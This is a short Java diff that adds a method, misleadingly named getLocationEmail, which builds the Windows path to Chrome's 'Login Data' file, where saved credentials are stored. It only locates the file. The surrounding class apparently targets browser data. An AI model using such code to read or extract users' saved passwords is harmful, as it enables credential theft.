@@ -22,6 +22,15 @@ public class OperatingSystem {
         throw new NotSupportedException("Operating system not supported:" + operatingSystem);
     }
 
+    //will change (eventually)
+    public static String getLocationEmail(BrowserEnum browser){
+        String operatingSystem = System.getenv("OS");
+        if (isWindows(operatingSystem)) {
+            return System.getenv("SystemDrive") + "\\Users\\" + System.getenv("USERNAME")  +"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+        }
+        throw new NotSupportedException("Operating system not supported:" + operatingSystem);
+    }
+
     private static String getWindowsLocation(BrowserEnum browser){
         StringBuilder sb = new StringBuilder();
         sb.append(System.getenv("SystemDrive"));
